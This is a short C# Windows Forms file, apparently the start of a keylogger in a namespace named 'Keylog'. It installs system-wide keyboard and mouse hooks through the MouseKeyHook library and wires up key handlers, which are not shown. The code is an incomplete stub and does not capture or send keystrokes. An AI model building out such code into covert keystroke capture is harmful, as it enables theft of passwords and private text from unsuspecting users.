using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace Keylog
{
    public partial class Form1 : Form
    {
        static IKeyboardMouseEvents ghk;
        public Form1()
        {
            InitializeComponent();
            ghk = Hook.GlobalEvents();
            ghk.KeyUp += KeyUp;
            ghk.KeyDown += KeyDown;
        }
    }
}
